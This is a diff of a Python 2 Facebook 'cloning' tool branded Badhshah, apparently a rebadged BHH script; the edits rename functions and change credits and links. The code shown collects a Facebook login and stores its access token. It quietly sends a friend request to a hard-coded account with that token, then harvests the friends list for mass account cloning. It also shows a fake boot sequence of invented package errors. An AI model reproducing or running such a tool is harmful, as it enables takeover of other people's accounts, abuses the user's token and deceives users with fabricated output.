@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To BHH
+#The Credit For This Code Goes To Sachin Shrivastv
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -42,19 +42,19 @@ def cetak(b):
     sys.stdout.write(x+'\n')
 
 
-def jalan(z):
+def typing(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.04)
 		
-def jalan1(z):
+def typing1(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
 		time.sleep(0.008)
 		
-def jalan2(z):
+def typing2(z):
 	for e in z + '\n':
 		sys.stdout.write(e)
 		sys.stdout.flush()
@@ -87,7 +87,7 @@ vulnot = "\033[31mNot Vuln"
 vuln = "\033[32mVuln"
 
 os.system("clear")
-jalan2("\033[1;94m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
+typing2("\033[1;94m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
 print  """\033[1;91m    ___    _____  ___    _   _  ___    _   _  _____  _   _ 
    (  _`\ (  _  )(  _`\ ( ) ( )(  _`\ ( ) ( )(  _  )( ) ( )
    | (_) )| (_) || | ) || |_| || (_(_)| |_| || (_) || |_| |
@@ -95,33 +95,33 @@ print  """\033[1;91m    ___    _____  ___    _   _  ___    _   _  _____  _   _
    | (_) )| | | || |_) || | | |( )_) || | | || | | || | | |
    (____/'(_) (_)(____/'(_) (_)`\____)(_) (_)(_) (_)(_) (_)
     """
-jalan2('\033[1;94m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')
-jalan2("\033[1;96m*****************************Booting****************************")
-jalan2("\033[1;93mGit clone https://www.github.com/Sac56/Badhshah")
+typing2('\033[1;94m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')
+typing2("\033[1;96m*****************************Booting****************************")
+typing2("\033[1;93mGit clone https://www.github.com/Sac56/Badhshah")
 time.sleep(0.2)
-jalan2("\033[1;93mCould not resolve host: dl.bintray.com")
-jalan2("\033[1;93mErr:2 https://dl.bintray.com/grimler/science-packages-21 science InRelease")
-jalan2("\033[1;93mCould not resolve host: dl.bintray.com")
-jalan2("\033[1;93mErr:3 https://termux.net stable InRelease")
-jalan2("\033[1;93mCould not resolve host: termux.net")
-jalan2("\033[1;93mReading package lists... Done")
-jalan2("\033[1;93mBuilding dependency tree")
-jalan2("\033[1;93mReading state information... Done")
-jalan2("\033[1;93mAll packages are up to date.")
-jalan2("\033[1;93mW: Failed to fetch https://termux.net/dists/stable/InRelease  Could not resolve host: termux.net")
-jalan2("\033[1;93mW: Failed to fetch https://dl.bintray.com/grimler/game-packages-21/dists/games/InRelease  Could not resolve host: dl.bintray.com")
-jalan2("\033[1;93mW: Failed to fetch https://dl.bintray.com/grimler/science-packages-21/dists/science/InRelease Could not resolve host: dl.bintray.com")
-jalan2("\033[1;93mW: Some index files failed to download. They have been ignored, or old ones used instead.") 
-jalan2("\033[1;96m█                       10%")
-jalan2('\033[1;96m█████                   30%')
-jalan2('\033[1;96m█████████               50%')
+typing2("\033[1;93mCould not resolve host: dl.bintray.com")
+typing2("\033[1;93mErr:2 https://dl.bintray.com/grimler/science-packages-21 science InRelease")
+typing2("\033[1;93mCould not resolve host: dl.bintray.com")
+typing2("\033[1;93mErr:3 https://termux.net stable InRelease")
+typing2("\033[1;93mCould not resolve host: termux.net")
+typing2("\033[1;93mReading package lists... Done")
+typing2("\033[1;93mBuilding dependency tree")
+typing2("\033[1;93mReading state information... Done")
+typing2("\033[1;93mAll packages are up to date.")
+typing2("\033[1;93mW: Failed to fetch https://termux.net/dists/stable/InRelease  Could not resolve host: termux.net")
+typing2("\033[1;93mW: Failed to fetch https://dl.bintray.com/grimler/game-packages-21/dists/games/InRelease  Could not resolve host: dl.bintray.com")
+typing2("\033[1;93mW: Failed to fetch https://dl.bintray.com/grimler/science-packages-21/dists/science/InRelease Could not resolve host: dl.bintray.com")
+typing2("\033[1;93mW: Some index files failed to download. They have been ignored, or old ones used instead.") 
+typing2("\033[1;96m█                       10%")
+typing2('\033[1;96m█████                   30%')
+typing2('\033[1;96m█████████               50%')
 time.sleep(0.09)
-jalan2('\033[1;96m███████████████         78%')
-jalan2('\033[1;96m████████████████████    100%')
-jalan2('\033[1;93m***********************Booting Complete...*********************')
+typing2('\033[1;96m███████████████         78%')
+typing2('\033[1;96m████████████████████    100%')
+typing2('\033[1;93m***********************Booting Complete...*********************')
 time.sleep(0.09)
 os.system('clear')
-jalan1("\033[1;94m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
+typing1("\033[1;94m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
 print  """\033[1;91m    ___    _____  ___    _   _  ___    _   _  _____  _   _ 
    (  _`\ (  _  )(  _`\ ( ) ( )(  _`\ ( ) ( )(  _  )( ) ( )
    | (_) )| (_) || | ) || |_| || (_(_)| |_| || (_) || |_| |
@@ -129,8 +129,8 @@ print  """\033[1;91m    ___    _____  ___    _   _  ___    _   _  _____  _   _
    | (_) )| | | || |_) || | | |( )_) || | | || | | || | | |
    (____/'(_) (_)(____/'(_) (_)`\____)(_) (_)(_) (_)(_) (_)
     """
-jalan1('\033[1;94m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')    
-
+typing1('\033[1;94m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')    
+print ("")
 
 
 CorrectUsername ="Badhshah"
@@ -147,31 +147,31 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;93mWrong Password"
-            os.system('xdg-open https://www.youtube.com/channel/UCT4i9Wvdsc6StAQFNQ9p3NQ')
+            os.system('xdg-open https://www.youtube.com/channel/UCtSuqtW3IouefleSsYyfh8Q')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/Aamirzkzk9211')
-
+        os.system('xdg-open https://www.facebook.com/sachin.shrivastv.71')
+        
 def login():
 	os.system('clear')
-	os.system('xdg-open https://chat.whatsapp.com/DaEl6GBC2ZK18IuI51chaL')
 	
 	try:
 		toket = open('login.txt','r')
 		menu() 
 	except (KeyError,IOError):
 		os.system('clear')
-		print logo1
+		typing2('\033[1;94m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█')
 		print logo
-		print logo2
-		jalan(' \033[1;91mWarning:- \033[1;93mDo Not Use Your Personal Account.' )
-		jalan(' \033[1;91mWarning:- \033[1;93mUse a New Account To Login.' )
-		jalan(' \033[1;91mWarning:- \033[1;93mThis Tool Is For Education Purpose Only.' )                 
-		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mBHH\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
-		print('	   \033[1;91m♡\x1b[1;91m✔✔✔✔✔✔✔LOGIN WITH FACEBOOK✔✔✔✔✔✔✔\x1b[1;91m♡' )
+		typing2('\033[1;94m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')
+		typing(' \033[1;91m█ Warning:- \033[1;93mDo Not Use Your Personal Account.\033[1;91m                █' )
+		typing(' \033[1;91m█ Warning:- \033[1;93mUse a New Account To Login.\033[1;91m                      █ ' )
+		typing(' \033[1;91m█ Warning:- \033[1;93mThis Tool Is For Education Purpose Only.        \033[1;91m\033[1;91m █ ' ) 
+		typing(' \033[1;91m█ Warning:- \033[1;93mDevloper Not Responsible For Any Misuse by Tool.\033[1;91m\033[1;91m █ ' )    		         
+		typing1 ("\033[1;91m █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█")
+		print('\033[1;91m\x1b[1;91m\x1b[1;94m ====================Logging With Facebook=====================' )
 		print('	' )
-		id = raw_input('\033[1;91m[+] \x1b[1;92mID/Email\x1b[1;95m: \x1b[1;93m')
-		pwd = raw_input('\033[1;91m[+] \x1b[1;91mPassword\x1b[1;96m: \x1b[1;93m')
+		id = raw_input('\033[1;91m\x1b[1;92mID/Email\x1b[1;95m:- \x1b[1;93m')
+		pwd = raw_input('\033[1;91m\x1b[1;92mPassword\x1b[1;96m:- \x1b[1;93m')
 		tik()
 		try:
 			br.open('https://m.facebook.com')
@@ -198,8 +198,8 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\x1b[1;92mLogin Successful.•◈•..'
-				os.system('xdg-openhttps://m.youtube.com/channel/UCT4i9Wvdsc6StAQFNQ9p3NQ')
+				print '\n\x1b[1;92mLogin Successful.'
+				os.system('xdg-open https://chat.whatsapp.com/DaEl6GBC2ZK18IuI51chaL') #Whatsapp Group Invite
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -241,14 +241,16 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;92mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Z K
+	os.system("clear") #Sachin Shrivastv
+	typing2('\033[1;94m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█')
 	print logo
-	print "  \033[1;92m«----•◈••◈•----\033[1;93mLogged in User Info\033[1;92m----•◈••◈•-----»"
+	typing2('\033[1;94m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█')
+	print "  \033[1;92m█»»»»»»»\033[1;93mLogged in User Info\033[1;92m««««««««««««█"
 	print "	   \033[1;91m Name\033[1;93m:\033[1;92m"+nama+"\033[1;93m               "
 	print "	   \033[1;91m ID\033[1;93m:\033[1;92m"+id+"\x1b[1;93m              "
 	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mBBH FAST\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
-	print "\033[1;97m-•◈•-\033[1;92m> \033[1;92m1.\x1b[1;92mSTART HACKING..."
-	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mExit            "
+	print "\033[1;97m-•◈•-\033[1;92m> \033[1;92m1.\x1b[1;92mStart Cloning...."
+	print "\033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91mExit             "
 	pilih()
 
 
@@ -260,7 +262,7 @@ def pilih():
 	elif unikers =="1":
 		super()
 	elif unikers =="0":
-		jalan('Token Removed')
+		typing('Token Removed')
 		os.system('rm -rf login.txt')
 		keluar()
 	else:
@@ -294,7 +296,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 		print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mBHH FAST\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•"
-		jalan('\033[1;93mGetting IDs \033[1;93m...')
+		typing('\033[1;93mGetting IDs \033[1;93m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -324,13 +326,13 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;91mTotal IDs\033[1;93m: \033[1;94m"+str(len(id))
-	jalan('\033[1;92mPlease Wait\033[1;93m...')
+	typing('\033[1;92mPlease Wait\033[1;93m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;91mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;92m«--•◈••◈•---\x1b[1;93m•◈•Stop Process Press CTRL+Z•◈•\033[1;92m---•◈••◈•-»"
 	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mYOUTUBE CHANNEL\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬•◈•"
-	jalan(' \033[1;93m🇵🇰\033[1;94m.....Cloning Start.....\033[1;93m🔍🔍🔍🔍🔍🔍🔍 ')#
+	typing(' \033[1;93m🇵🇰\033[1;94m.....Cloning Start.....\033[1;93m🔍🔍🔍🔍🔍🔍🔍 ')#
 	print "\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬╬•◈•\033[1;91mBHH FAST\033[1;92m•◈•╬╬╬╬╬╬╬╬╬╬╬•◈•"
 	
 			
@@ -340,7 +342,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Z K
+			pass #Sachin Shrivastv
 		try:
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 			b = json.loads(a.text)
